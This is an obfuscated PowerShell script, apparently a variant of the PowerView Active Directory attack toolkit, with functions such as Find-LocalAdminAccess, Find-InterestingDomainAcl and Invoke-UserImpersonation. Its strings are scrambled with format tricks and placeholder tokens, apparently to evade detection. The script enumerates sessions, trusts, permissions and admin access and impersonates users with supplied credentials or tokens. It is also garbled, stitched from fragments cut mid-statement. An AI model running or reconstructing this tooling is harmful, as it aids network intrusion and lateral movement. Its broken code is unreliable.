-fS5zmumS5z,S5zMaxiS5z,S5zFuncS5z,S5ztionCS5z,S5zuntS5z,S5zoS5z),(Z3b{0}{1}{4}{2}{3}Z3b-f S5zMaxS5z,S5ziS5z,S5ztorS5z,S5zyCountS5z,S5zmumHisS5z),(Z3b{0}{3}{2}{1}{4}Z3b-fS5zMaximumVarS5z,S5zbleS5z,S5zaS5z,S5ziS5z,S5zCountS5z),(Z3b{1}{3}{2}{0}Z3b -f S5zonS5z,S5zMyInS5z,S5zocatiS5z,S5zvS5z),(Z3b{0}{1}Z3b-f S5znS5z,S5zullS5z),S5zPIDS5z,(Z3b{2}{1}{3}{0}Z3b -f S5zrsS5z,S5zSBoundParamS5z,S5zPS5z,S5zeteS5z),(Z3b{2}{1}{0}Z3b-fS5zdPathS5z,S5zmanS5z,S5zPSComS5z),(Z3b{0}{1}{2}Z3b -f S5zPS5z,S5zSCulturS5z,S5zeS5z),(Z3b{1}{2}{6}{4}{0}{3}{5}Z3b-fS5zameterS5z,S5zPS5z,S5zSDS5z,S5zVS5z,S5zaultParS5z,S5zaluesS5z,S5zefS5z),(Z3b{0}{1}Z3b -f S5zPSHOS5z,S5zMES5z),(Z3b{1}{0}{2}Z3b -f S5zSScriptRooS5z,S5zPS5z,S5ztS5z),(Z3b{0}{1}{3}{2}Z3b -fS5zPSS5z,S5zUICS5z,S5zeS5z,S5zulturS5z),(Z3b{0}{2}{1}{3}Z3b -f S5zPS5z,S5znTS5z,S5zSVersioS5z,S5zableS5z),S5zPWDS5z,(Z3b{2}{1}{0}Z3b-f S5zlIdS5z,S5zlS5z,S5zSheS5z),(Z3b{0}{1}{2}Z3b','yS5z,S5zNotS5z,S5zeS5z) (Z3b{1}{0}Z3b -fS5zrS5z,S5zUseS5z) YoV{oIJKWIJKNER}.Z3bUsIJKerZ3b
                    YoV{pROIJKceIJKSS}.Z3bpSOBIJKjIJKECTZ3b.Z3bTyIJKpenamESZ3b.(Z3b{0}{1}Z3b -fS5zIS5z,S5znsertS5z).Invoke(0, (Z3b{5}{2}{3}{1}{4}{0}Z3b-f S5zsS5z,S5z.UsS5z,S5zowerVieS5z,S5zwS5z,S5zerProcesS5z,S5zPS5z))
                    YoV{PRIJKoIJKcESs}
                }
            }
            catch {
                &(Z3b{1}{3}{0}{2}Z3b-fS5zerbosS5z,S5zWriteS5z,S5zeS5z,S5z-VS5z) (S5z[GeS5z+S5zt-WS5z+S5zMIPS5z+S5zrocess]S5z+S5z S5z+S5zErS5z+S5zroS5z+S5zr S5z+S5zeS5z+S5znumS5z+S5zeratS5z+S5zing S5z+S5zreS5z+S5zmote S5z+S5zprocS5z+S5zeS5z+S5zsses S5z+S5zoS5z+S5zn S5z+Z3bS5zYoVComputerS5z, Z3b+S5zaS5z+S5zccS5z+S5zess S5z+S5zlS5z+S5zikely S5z+S5zdenS5z+S5ziS5z+S5zed: S5z+Z3bYoV_Z3b)
            }
        }
    }
}


function FiNd-iIJKNIJKTeIJKRIJKeSIJKTINGFIJKILe {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{2}{0}{3}{1}Z3b -f S5zdS5z,S5zcessS5z,S5zPSShoulS5z,S5zProS',').Invoke()

                
                YoV{offIJKsIJKET} = YoV{PPsEIJKssIoNIJKiNIJKFO}.(Z3b{1}{0}Z3b-fS5znt64S5z,S5zToIS5z).Invoke()

                if ((YoV{rEsIJKUlT} -ne 0) -and (YoV{ofFIJKset} -gt 0)) {

                    
                    YoV{inCReMIJKeIJKNT} = YoV{wTs_IJKsIJKeIJKssiOn_IJKinIJKFo_1}::(Z3b{1}{0}Z3b -fS5ztSizeS5z,S5zGeS5z).Invoke()

                    
                    for (YoV{I} = 0; (YoV{I} -lt YoV{pIJKcOIJKUnT}); YoV{I}++) {

                        
                        YoV{NEwIJKINtPIJKTr} = &(Z3b{1}{2}{0}Z3b -f S5ztS5z,S5zNew-S5z,S5zObjecS5z) (Z3b{0}{1}{2}{3}Z3b-fS5zSyS5z,S5zstem.S5z,S5zIS5z,S5zntptrS5z) -ArgumentList YoV{OFfSIJKet}
                        YoV{INIJKFo} = YoV{NEwIJKInTIJKPTR} -as YoV{wIJKTIJKs_sesSIJKiIJKON_INfo_1}

                        YoV{rdIJKpSIJKeSSION} = &(Z3b{0}{2}{1}Z3b-fS5zNew-S5z,S5zctS5z,S5zObjeS5z) (Z3b{0}{1}{2}Z3b -f S5zPSOS5z,S5zbS5z,S5zjectS5z)

                        if (YoV{iIJKNfO}.Z3bpHOSTIJKNIJKAMeZ3b) {
                            YoV{rIJKDpIJKsEIJKssION} JGO &(Z3b{0}{1}{2}Z3b -f S5zAddS5z,S5z-MeS5z,S5zmberS5z) (Z3b{1}{2}{0}Z3b -fS5zrtyS5z,S5zNS5z,S5zotepropeS5z) (Z3b{3}{2}{0}{1}Z3b -fS5zrNaS5z,S5zmeS5z,S5zmputeS5z,S5zCoS5z) YoV{InIJKFO}.Z3bphOStIJKNaIJKMEZ3b
                        }
                        else {
                            
                            YoV{RdpIJKSeIJKSIJKsIOn} JGO &(Z3b{1}{0}{2}Z3b-fS5zdd-S5z,S5zAS5z,S5zMemberS5z) (Z3b{1}{0}{2}Z3b -f S5zeproS5z,S5zNotS5z,S5zpertyS5z) (Z3b{2}{0}{1}Z3b-f S5zaS5z,S5zmeS5z,S5zComputerNS5z) YoV{comIJKpIJKUter}
                        }

                        YoV{RIJKDIJKpSeIJKssion} JGO &(Z3b{0}{2}{3}{1}Z3b -f S5zAdd-S5z,S5zrS5z,S5zMemS5z,S5zbeS5z) (Z3b{2}{0}{1}Z3b -fS5zpeS5z,S5zrtyS5z,S5zNoteproS5z) (Z3b{0}{3}{1}{2}Z3b-f S5zSS5z,S5zsS5z,S5zsionNameS5z,S5zeS5z) YoV{InIJKFo}.Z3bpIJKsIJKesSIonnAIJKMeZ3b

                        if (YoV(-not YoV{InIJKFo}.Z3bpDIJKomAINIJKNAmeZ3b) -or (YoV{iIJKNfo}.Z3bPdOIJKMAIIJKNIJKNAMEZ3b -eq S5zS5z)) {
                            
                            YoV{rdPsIJKeSIJKsIIJKon} JGO &(Z3b{1}{0}{2}Z3b-fS5zeS5z,S5zAdd-MembS5z,S5zrS5z) (Z3b{1}{3}{2}{0}Z3b -f S5zropertyS5z,S5zNoS5z,S5zpS5z,S5zteS5z) (Z3b{2}{1}{0}Z3b-fS5zeS5z,S5zerNamS5z,S5zUsS5z) Z3bYoV(YoVInfo.pUserName)Z3b
                        }
                        else {
                            YoV{RdIJKPseIJKsIJKsIoN} JGO &(Z3b{3}{0}{2}{1}Z3b-fS5zdS5z,S5zrS','IJKUT} JGO &(Z3b{2}{1}{0}Z3b-f S5zrS5z,S5z-MembeS5z,S5zAddS5z) (Z3b{0}{2}{1}Z3b-f S5zNotS5z,S5zyS5z,S5zePropertS5z) (Z3b{2}{3}{1}{0}Z3b -fS5zalueS5z,S5zeVS5z,S5zAttriS5z,S5zbutS5z) YoV{TemIJKpOIJKBIJKJecT}.Z3bpsZIJKoBIJKJeIJKCtdNZ3b
                        YoV{OuIJKTput} JGO &(Z3b{2}{0}{1}Z3b-fS5z-MembS5z,S5zerS5z,S5zAddS5z) (Z3b{1}{2}{0}Z3b -fS5zertyS5z,S5zNotePrS5z,S5zopS5z) (Z3b{0}{3}{1}{2}Z3b-f S5zTimeS5z,S5zateS5z,S5zdS5z,S5zCreS5z) YoV{tIJKEmPObJeIJKcT}.Z3bfIJKTIJKIMEcIJKReATEdZ3b
                        YoV{outIJKpUT} JGO &(Z3b{2}{1}{0}Z3b-f S5zemberS5z,S5zdd-MS5z,S5zAS5z) (Z3b{0}{1}{3}{2}Z3b -f S5zNS5z,S5zotePropS5z,S5zyS5z,S5zertS5z) (Z3b{0}{3}{2}{1}Z3b -fS5zTimS5z,S5ztedS5z,S5zeS5z,S','   
                            YoV{nIJKUlL} = YoV{dIJKOMaIJKiNs}.(Z3b{0}{1}Z3b-f S5zPS5z,S5zushS5z).Invoke(YoV{tIJKRuST}.Z3bTArIJKGeIJKTNAmeZ3b)
                            YoV{trIJKUSt}
                        }
                    }
                }
            }
            catch {
                &(Z3b{2}{3}{1}{0}Z3b -fS5zeS5z,S5zerbosS5z,S5zWritS5z,S5ze-VS5z) (S5z[S5z+S5zGet-DomainS5z+S5zTrustMS5z+S5zaS5z+S5zppinS5z+S5zg] S5z+S5zErroS5z+S5zr: S5z+Z3bYoV_Z3b)
            }
        }
    }
}


function getIJK-gIJKpodElegIJKAIJKTIOn {


    [CmdletBinding()]
    Param (
        [String]
        YoV{GIJKpIJKonAmE} = S5z*S5z,

        [ValidateRange(1,10000)] 
        [Int]
        YoV{PagIJKeSize} = 200
    )

    YoV{ExIJKCLIJKUSiOnS} = @((Z3b{0}{1}Z3b -f S5zSYSTS5z,S5zEMS5z),(Z3b{1}{2}{3}{0}Z3b -f S5zsS5z,S5zDomain AdS5z,S5zmiS5z,S5znS5z),(Z3b{0}{2}{3}{4}{','pAIJKRAMETEIJKRS}[(Z3b{0}{1}Z3b -fS5zDomS5z,S5zainS5z)]) { YoV{SEIJKArIJKChIJKERarGuMeIJKNTS}[(Z3b{1}{0}Z3b -fS5zinS5z,S5zDomaS5z)] = YoV{DomI','YoV{comIJKpUtIJKernaME} = YoV{EnV:cOmPuIJKTErIJKNAIJKme},

        [Parameter(vALueFROMpipeLINEByprOPertynAmE = YoV{tRIJKUE})]
        [ValidateNotNullOrEmpty()]
        [String]
        YoV{gRIJKOUPNIJKAme} = (Z3b{3}{4}{1}{2}{0}Z3b-fS5zorsS5z,S5zstS5z,S5zratS5z,S5zAdmS5z,S5ziniS5z),

        [ValidateSet(S5zAPIS5z, {Z3b{0}{1}Z3b-fS5zWinNS5z,S5zTS5z})]
        [Alias({Z3b{3}{2}{0}{1}Z3b -f S5ztionMethoS5z,S5zdS5z,S5zecS5z,S5zCollS5z})]
        [String]
        YoV{meIJKTIJKhoD} = S5zAPIS5z,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{CIJKREdeNIJKTIJKIaL} =   YoV{jIJKFI}::Z3bEmpIJKTyZ3b
    )

    BEGIN {
        if (YoV{pSBIJKOIJKUnDPARAIJKMEIJKTIJKErS}[(Z3b{1}{0}{2}Z3b-f S5zdentS5z,S5zCreS5z,S5zialS5z)]) {
            YoV{LOGIJKONtIJKoIJKKEn} = &(Z3b{2}{4}{0}{3}{1}Z3b -f S5zImpeS5z,S5zionS5z,S5zInvoke-UsS5z,S5zrsonatS5z,S5zerS5z) -Credential YoV{credIJKeNTiIJKAL}
        }
    }

    PROCESS {
        ForEach (YoV{ComIJKpUtIJKER} in YoV{cIJKoIJKMPuterIJKNIJKAMe}) {
            if (YoV{MeIJKThod} -eq S5zAPIS5z) {
                

                
                YoV{qIJKUERYIJKlEVEl} = 2
                YoV{PIJKTRIJKiNFo} =  (  &(Z3b{3}{1}{2}{0}Z3b-fS5zLES5z,S5z-variS5z,S5zaBS5z,S5zGeTS5z)  6rk25P ).Z3bvAIJKLuEZ3b::Z3bzeIJKROZ3b
                YoV{EIJKNIJKTIJKRIesReAd} = 0
                YoV{TotAlRIJKEIJKAd} = 0
                YoV{RESIJKUMIJKeHanDlE} = 0

                
                YoV{rEsuIJKlT} = YoV{nETIJKAIJKPI32}::Z3bNETlOCalgIJKRoIJKUpGEIJKTIJKMeIJKmBeRSZ3b(YoV{CoMIJKpuIJKTeR}, YoV{gIJKROuPnIJKAmE}, YoV{qIJKUerIJKYLEVEl}, [ref]YoV{pIJKTRIJKinFO}, -1, [ref]YoV{EnIJKTRIJKieSIJKREad}, [ref]YoV{TOtaIJKlrEIJKAD}, [ref]YoV{REsIJKUIJKmEIJKHaIJKNDLE})

                
                YoV{oFfIJKset} = YoV{PTIJKRINIJKFo}.(Z3b{0}{2}{1}Z','ES5z,S5zorS5z,S5zach-ObjecS5z,S5ztS5z,S5zFS5z) {
                            if(YoV{_}.Z3bGplIJKiNKZ3b) {
                                
                                YoV{_}.Z3bGPIJKliIJKNKZ3b.Z3bsIJKpLitZ3b(S5z][S5z) JGO &(Z3b{3}{1}{2}{0}Z3b-fS5zectS5z,S5zorEaS5z,S5zch-ObjS5z,S5zFS5z) {
                                    if (YoV{_}.(Z3b{3}{0}{1}{2}Z3b -f S5ztarS5z,S5ztS5z,S5zswithS5z,S5zsS5z).Invoke((Z3b{0}{1}Z3b-fS5zLDAS5z,S5zPS5z))) {
                                        YoV{_}.(Z3b{1}{0}Z3b-f S5zplitS5z,S5zsS5z).Invoke(S5z;S5z)[0]
                                    }
                                }
                            }
                        }
                    }
                }

                
                YoV{OBJECTDOMIJKAIIJKNIJKDN} = YoV{obJeCIJKTIJKDN}.(Z3b{3}{2}{1}{0}Z3b -fS5zgS5z,S5ztrinS5z,S5zSS5z,S5zSubS5z).Invoke(YoV{oBjIJKECtIJKDn}.(Z3b{1}{0}{2}Z3b-fS5zndexOS5z,S5zIS5z,S5zfS5z).Invoke(S5zDC=S5z))
                YoV{sIJKeIJKArchERAIJKRGuMENts}.(Z3b{0}{1}Z3b -fS5zRemoS5z,S5zveS5z).Invoke((Z3b{1}{0}Z3b-f S5zdentityS5z,S5zIS5z))
                YoV{sEIJKARChErIJKArGIJKUMEnts}.(Z3b{0}{2}{1}Z3b -f S5zRemS5z,S5zveS5z,S5zoS5z).Invoke((Z3b{0}{2}{1}Z3b','                 YoV{iIJKNTIJKeRESTINIJKGaCL}
                            }
                        }
                        else {
                            &(Z3b{2}{0}{1}Z3b-fS5ziteS5z,S5z-WarningS5z,S5zWrS5z) Z3b[Find-InterestingDomainAcl] Unable to convert SID S5zYoV(YoV_.SecurityIdentifier.Value )S5z to a distinguishedname with Convert-ADName Z3b
                        }
                    }
                }
            }
        }
    }
}


function gEt-dIJKOMAINIJKoU {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{3}{2}{0}{1}Z3b -f S5zeS5z,S5zssS5z,S5zouldProcS5z,S5zPSShS5z}, S5zS5z)]
    [OutputType({Z3b{2}{1}{0}Z3b-f S5zerView.OUS5z,S5zowS5z,S5zPS5z})]
    [CmdletBinding()]
    Param (
        [Parameter(pOsItion = 0, VaLUEfRomPIpeLINe = YoV{tIJKRUe}, valUEFROmpipELiNEbypropErTYnAmE = YoV{TIJKRuE})]
        [Alias({Z3b{1}{0}Z3b-f S5zeS5z,S5zNamS5z})]
        [String[]]
        YoV{iIJKDENIJKTIty},

        [ValidateNotNullOrEmpty()]
        [String]
        [Alias({Z3b{0}{1}Z3b -f S5zGUIS5z,S5zDS5z})]
        YoV{gpLiIJKNk},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{DoIJKmAIJKIN},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{2}{0}{1}Z3b-fS5zteS5z,S5zrS5z,S5zFilS5z})]
        [String]
        YoV{lDAIJKpFIJKiLTEr},

        [ValidateNotNullOrEmpty()]
        [String[]]
        YoV{PrOpIJKeIJKRTiES},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{1}{0}{2}Z3b -fS5zSPaS5z,S5zADS5z,S5zthS5z})]
        [String]
        YoV{SeaIJKRChbIJKAIJKSE},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{2}{4}{0}{3}{1}Z3b -f S5zntrollS5z,S5zrS5z,S5zDomaS5z,S5zeS5z,S5zinCoS5z})]
        [String]
        YoV{SeRIJKVIJKer},

        [ValidateSet({Z3b{1}{0}Z3b-f S5zeS5z,S5zBasS5z}, {Z3b{0}{1}Z3b -fS5zOneLevS5z,S5zelS5z}, {Z3b{0}{1}{2}Z3b -fS5zSubS5z,S5ztreS5z,S5zeS5z})]
        [String]
        YoV{SEARCHIJKscoIJKpE} = (Z3b{0}{1}Z3b-fS5zSS5z,S5zubtreeS5z),

        [ValidateRange(1, 10000)]
        [Int]
        YoV{rEIJKSIJKULtPaIJKGEsIze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        YoV{SEIJKRVEIJKRtimelIJKIIJKmit},

        [ValidateSet({Z3b{0}{1}Z3b-fS5zDaS5z,S5zclS5z}, {Z3b{0}{1}Z3b -f S5zGS5z,S5zroupS5z}, {Z3b{1}{0}Z3b-f S5zeS5z,S5zNonS5z}, {Z3b{0}{1}Z3b-fS5zOwS5z,S5znerS5z}, {Z3b{0}{1}Z3b-f S5zSacS5z,S5zlS5z})]
        [String]
        YoV{sECIJKUrIJKiTymAsIJKKs},

        [Switch]
        YoV{tIJKOMBSTOIJKNE},

        [Alias({Z3b{1}{0}{2}Z3b -f S5znS5z,S5zReturnOS5z,S5zeS5z})]
        [Switch]
        YoV{FIJKIIJKNDonE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{CrEDEIJKN',',S5ztS5z,S5zerS5z) (Z3b{1}{0}Z3b-f S5zNS5z,S5zObjectDS5z) YoV{OBJIJKecT}.Z3bdisIJKTINguIsIJKHEIJKDNAIJKME','         ForEach (YoV{TIJKArgETClAIJKSs',')Z3b
                }
                elseif (YoV{IdIJKEntiIJKTyIIJKNSIJKTANIJKce}.(Z3b{0}{1}{2}Z3b-fS5zCoS5z,S5zntaiS5z,S5znsS5z).Invoke(S5z.S5z)) {
                    YoV{ideNTItIJKyfIJKiIJKltEr} += Z3b(JGO(samAccountNa','Z3b-fS5zectS5z,S5zNew-ObS5z,S5zjS5z) (Z3b{1}{3}{4}{2}{0}Z3b -f S5ztackS5z,S5zSysteS5z,S5zSS5z,S5zmS5z,S5z.Collections.S5z)

    YoV{DOMIJKAIntIJKRuSTaRIJKguMIJKenTs} = @{}
    if (YoV{PSIJKBIJKOUNIJKdParAmetErS}[S5zAPIS5z]) { YoV{DIJKOmaI','1}Z3b -fS5zInseS5z,S5zrtS5z).Invoke(0, (Z3b{1}{0}{5}{4}{2}{3}Z3b-fS5zerView.S5z,S5zPowS5z,S5zAS5z,S5zCLS5z,S5zeS5z,S5zFilS5z))
                    YoV{OIJKUT}
                }
            }
            catch {
                &(Z3b{2}{1}{0}Z3b-fS5z-VerboseS5z,S5zeS5z,S5zWritS5z) (S5z[Get-PaS5z+S5zthS5z+S5zAS5z+S5zclS5z+S5z] S5z+S5zerror:S5z+S5z S5z+Z3bYoV_Z3b)
            }
        }
    }

    END {
        
        YoV{MIJKApPIJKEdCOMpuIJKTIJKERS}.Z3bKEIJKysZ3b JGO &(Z3b{3}{1}{2}{0}Z3b-fS5zConnectionS5z,S5zemove-RemoS5z,S5zteS5z,S5zRS5z)
    }
}


function cIJKOnIJKVEIJKRt-LdIJKApPROPIJKeIJKRtY {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{2}{3}{4}{0}{1}Z3b -fS5zuS5z,S5zldProcessS5z,S5zPSS5z,S5zShS5z,S5zoS5z}, S5zS5z)]
    [OutputType({Z3b{1}{6}{3}{5}{0}{4}{2}{7}Z3b-fS5zent.Automation.PSCS5z,S5zSyS5z,S5ztomObjeS5z,S5zManagS5z,S5zusS5z,S5zemS5z,S5zstem.S5z,S5zctS5z})]
    [CmdletBinding()]
    Param(
        [Parameter(mAndATORY = YoV{tRIJKUe}, VAlUefrOMPIpelINe = YoV{trIJKUe})]
        [ValidateNotNullOrEmpty()]
        YoV{PRopIJKertIJKiEs}
    )

    YoV{ObJIJKEIJKCTIJKProIJKpERtieS} = @{}

    YoV{PRIJKoPIJKeRtiIJKEs}.Z3bPROPIJKErTIJKYNAMesZ3b JGO &(Z3b{1}{0}{2}Z3b -f S5zach-ObjS5z,S5zForES5z,S5zectS5z) {
        if (YoV{_} -ne (Z3b{2}{0}{1}Z3b-fS5zdS5z,S5zspathS5z,S5zaS5z)) {
            if ((YoV{_} -eq (Z3b{0}{1}{2}Z3b -f S5zoS5z,S5zbjeS5z,S5zctsidS5z)) -or (YoV{_} -eq (Z3b{0}{2}{1}Z3b -f S5zsiS5z,S5zhistoryS5z,S5zdS5z))) {
                
                YoV{ObjEcIJKTPrIJKOPIJKeIJKRTIJKIEs}[YoV{_}] = YoV{pIJKRopIJKErIJKTIeS}[YoV{_}] JGO &(Z3b{3}{0}{2}{1}Z3b -f S5zrS5z,S5ztS5z,S5zEach-ObjecS5z,S5zFoS5z) { (&(Z3b{2}{0}{1}Z3b-fS5zwS5z,S5z-ObjectS5z,S5zNeS5z) (Z3b{4}{2}{8}{5}{1}{0}{6}{7}{10}{9}{3}{11}Z3b-fS5z.SeS5z,S5zlS5z,S5zecurity.PrincS5z,S5zieS5z,S5zSystem.SS5z,S5zaS5z,S5zcS5z,S5zurityS5z,S5zipS5z,S5zentifS5z,S5zIdS5z,S5zrS5z)(YoV{_}, 0)).Z3bvALIJKUeZ3b }
            }
            elseif (YoV{_} -eq (Z3b{0}{1}{3}{2}Z3b-fS5zgS5z,S5zroS5z,S5ztypeS5z,S5zupS5z)) {
                YoV{ObIJKjeCtIJKPRoPEIJKRtIJKIEs}[YoV{_}] = YoV{PIJKRIJKoperIJKTIEs}[YoV{_}][0] -as YoV{GIJKROIJKUIJKpTyIJKpeEnUM}
            }
            elseif (YoV{_} -eq (Z3b{1}{3}{4}{2}{0}Z3b-f S5zeS5z,S5zsamS5z,S5zypS5z,S5zaccS5z,S5zounttS5z)) {
                YoV{obIJKjecIJKTPRoPeIJKRtIeS}[YoV{_}] = YoV{pROIJKpEIJKRTiES}[YoV{_}][0] -as YoV{SaIJKMaIJKccIJKOuNTTyPEEnIJKUM}
            }
            elseif (YoV{_} -eq (Z3b{1}{2}{0}Z3b-fS5zidS5z,S5zobjecS5z,S5ztguS5z)) {
                
                YoV{oIJKBJEIJKcIJKTPRopIJKERTIeS}[YoV{_}] = (&(Z3b{0}{1}{2}Z3b -fS5zNS5z,S5zeS5z,S5zw-ObjectS5z) (Z3b{1}{0}Z3b-f S5zidS5z,S5zGuS5','pNameS5z) YoV{_}.Z3bsAmAIJKCIJKcOUNTIJKNaMeZ3b
            YoV{MAnIJKAgEDgRIJKOUP} JGO &(Z3b{0}{1}{2}Z3b-f S5zAdS5z,S5zd-MembeS5z,S5zrS5z) (Z3b{0}{1}{2}Z3b -f S5zNotepS5z,S5zroperS5z,S5ztyS5z) (Z3b{1}{0}{3}{4}{2}Z3b -fS5zDiS5z,S5zGroupS5z,S5zdNameS5z,S5zstiS5z,S5znguisheS5z) YoV{_}.Z3bDistIJKiIJKNGUiIJKshedIJKNAMeZ3b
            YoV{MIJKANaGEDGIJKROup} JGO &(Z3b{1}{3}{0}{2}Z3b-fS5zmbS5z,S5zAdS5z,S5zerS5z,S5zd-MeS5z) (Z3b{1}{0}{2}Z3b -fS5zopeS5z,S5zNoteprS5z,S5zrtyS5z) (Z3b{1}{2}{0}{3}Z3b -fS5zgeS5z,S5zMaS5z,S5znaS5z,S5zrNameS5z) YoV{gRIJKouPMaIJKNaIJKgeR}.Z3bsAMaCIJKcIJKOUIJKNTnaIJKMEZ3b
            YoV{MANaGeDIJKgRIJKoup} JGO ','nts}[(Z3b{2}{1}{0}Z3b -f S5zalS5z,S5zredentiS5z,S5zCS5z)] = YoV{cIJKRIJKedenTiaL} }

        if (YoV{PsBOUIJKNIJKdpArIJKAmetEIJKRs}[(Z3b{2}{1}{3}{0}Z3b -fS5zameS5z,S5zmpuS5z,S5zCoS5z,S5zterNS5z)]) {
            YoV{TaRGIJKEtcIJKoMIJKPIJKUIJKTers} = YoV{cOmIJKPIJKUTeIJKRNAmE}
        }
        else {
            &(Z3b{0}{2}{3}{1}Z3b-fS5zWritS5z,S5zseS5z,S5ze-VerbS5z,S5zoS5z) (Z3b{9}{13}{2}{1}{5}{6}{0}{4}{10}{12}{8}{11}{7}{3}Z3b-f S5zinS5z,S5zdS5z,S5zinS5z,S5znS5z,S5zAS5z,S5z-S5z,S5zLocalAdmS5z,S5zhe domaiS5z,S5zompuS5z,S5z[S5z,S5zccess] S5z,S5zters in tS5z,S5zQuerying cS5z,S5zFS5z)
            YoV{TIJKARGIJKEtcOmIJKpuTeRS} = &(Z3b{0}{3}{2}{1}Z3b -f S5zGeS5z,S5zputerS5z,S5zomainComS5z,S5zt-DS5z) @ComputerSearcherArguments JGO &(Z3b{0}{1}{3}{2}Z3b-f S5zSS5z,S5zelect-ObS5z,S5zctS5z,S5zjeS5z) -ExpandProperty (Z3b{3}{2}{1}{0}Z3b-f S5zmeS5z,S5ztnaS5z,S5zsS5z,S5zdnshoS5z)
        }
        &(Z3b{0}{1}{2}Z3b -fS5zWritS5z,S5ze-VerS5z,S5zboseS5z) Z3b[Find-LocalAdminAccess] TargetComputers length: YoV(YoVTargetComputers.Length) Z3b
        if (YoV{tArIJKgIJKeTCOIJKmpUteRs}.Z3blIJKEngTHZ3b -eq 0) {
            throw (Z3b{4}{10}{8}{0}{7}{2}{11}{5}{9}{6}{3}{1}Z3b -fS5z] NS5z,S5zeS5z,S5zstsS5z,S5zumeratS5z,S5z[Find-S5z,S5zoundS5z,S5z enS5z,S5zo hoS5z,S5zssS5z,S5z toS5z,S5zLocalAdminAcceS5z,S5z fS5z)
        }

        
        YoV{HoSIJKTeNuMbIJKloIJKcK} = {
            Param(YoV{coMpIJKUIJKTIJKErNIJKAme}, YoV{TOIJKkEnIJKhIJKAndLe})

            if (YoV{toIJKkEIJKNhaIJKNdlE}) {
                
                YoV{nIJKUll} = &(Z3b{1}{4}{2}{0}{5}{3}Z3b-fS5zrIS5z,S5zInS5z,S5zseS5z,S5znS5z,S5zvoke-US5z,S5zmpersonatioS5z) -TokenHandle YoV{tIJKoKIJKENHaNdLE} -Quiet
            }

            ForEach (YoV{TarIJKgEIJKTCOmPIJKUTIJKeR} in YoV{coMPUTEIJKRIJKNaIJKmE}) {
                YoV{uIJKp} = &(Z3b{0}{1}{2}{4}{3}Z3b-f S5zTesS5z,S5zt-CS5z,S5zoS5z,S5znectionS5z,S5znS5z) -Count 1 -Quiet -ComputerName YoV{TAIJKRIJKgEtIJKCOmPUIJKTER}
                if (YoV{UIJKp}) {
                    
                    YoV{aCIJKcEsS} = &(Z3b{1}{0}{2}Z3b-fS5zt-AdminAcS5','x02S5z,S5z19fS5z,S5z0S5z) = (Z3b{1}{2}{0}{3}Z3b -f S5zaS5z,S5zRS5z,S5zeS5z,S5zdAndWriteS5z)
                [uint32](Z3b{1}{0}{2}Z3b-fS5zx0200S5z,S5z0S5z,S5z89S5z) = (Z3b{1}{0}Z3b-f S5zdS5z,S5zReaS5z)
                [uint32](Z3b{2}{0}{1}Z3b -f S5z0001S5z,S5z16S5z,S5z0xS5z) = (Z3b{1}{0}Z3b-fS5ziteS5z,S5zWrS5z)
            }

            YoV{peIJKRMiIJKssIoNs} = @()

            
            YoV{PIJKeRmIJKISSiONs} += YoV{sIJKimplePERIJKmIIJKsSIOns}.Z3bKIJKeysZ3b JGO &(Z3b{2}{0}{3}{1}Z3b -fS5zorES5z,S5zh-ObjectS5z,S5zFS5z,S5zacS5z) {
                              if ((YoV{fIJKsR} -band YoV{_}) -eq YoV{_}) {
                                YoV{siMPIJKLEPIJKe','S}[(Z3b{1}{2}{0}Z3b-f S5zinS5z,S5zDoS5z,S5zmaS5z)]) {
            ForEach (YoV{taRGIJKeTdoMIJKAIn} in YoV{dOmIJKAiN}) {
                YoV{seaIJKRcIJKHIJKERIJKAIJKRguMEnTs}[(Z3b{1}{0}Z3b -fS5','}{0}{2}{1}{3}Z3b -f S5zorS5z,S5zcS5z,S5zEach-ObjeS5z,S5ztS5z,S5zFS5z) {
                        
                        YoV{GIJKRIJKoupSID} = (&(Z3b{0}{1}{2}Z3b -fS5zNew-OS5z,S5zbS5z,S5zjectS5z) (Z3b{5}{8}{4}{1}{7}{0}{9}{11}{10}{6}{3}{2}Z3b -fS5zncS5z,S5zrS5z,S5zentifierS5z,S5zyIdS5z,S5z.PS5z,S5zSysS5z,S5zitS5z,S5ziS5z,S5ztem.SecurityS5z,S5zipal.SS5z,S5zurS5z,S5zecS5z)(YoV{_},0)).Z3bvALIJKUEZ3b

                        
                        if (YoV{gROupIJKSIJKId} -notmatch (Z3b{3}{2}{1}{0}Z3b -fS5z2-.*S5z,S5z-5-3S5z,S5z-1S5z,S5z^SS5z)) {
                            YoV{SeArCHErIJKARGIJKUMIJKENts}[(Z3b{1}{0}{2}Z3b -f S5zenS5z,S5zIdS5z,S5ztityS5z)] = YoV{gIJKRouIJKPsId}
                            YoV{seARChEIJKRIJKAIJKRGuIJKMENTS}[S5zRawS5z] = YoV{fIJKALSE}
                            if (YoV{oIJKlDPrOpIJKeRIJKTiES}) { YoV{seIJKAIJKRchIJKERARIJKGUMENts}[(Z3b{1}{3}{2}{0}Z3b-fS5zsS5z,S5zPS5z,S5zertieS5z,S5zropS5z)] = YoV{oLIJKdpIJKROPIJKeIJKRties} }
                            YoV{GRIJKoIJKUp} = &(Z3b{2}{1}{0}{3}Z3b -fS5z-DomaS5z,S5ztS5z,S5zGeS5z,S5zinObjectS5z) @SearcherArguments
                            if (YoV{gRoIJKUP}) {
                                YoV{GrIJKoIJKUp}.Z3bPSIJKObjIJKecTZ3b.Z3btypEnIJKAMIJKESZ3b.(Z3b{1}{0}{2}Z3b -fS5zsS5z,S5zInS5z,S5zertS','opS5z,S5zyS5z,S5zrtS5z) (Z3b{3}{1}{2}{0}Z3b-fS5zmeS5z,S5zPODisS5z,S5zplayNaS5z,S5zGS5z) YoV{GIJKpo}.Z3bPIJKRIJKOpertIJKIEsZ3b.Z3bDISPLIJKAYnIJKAMeZ3b
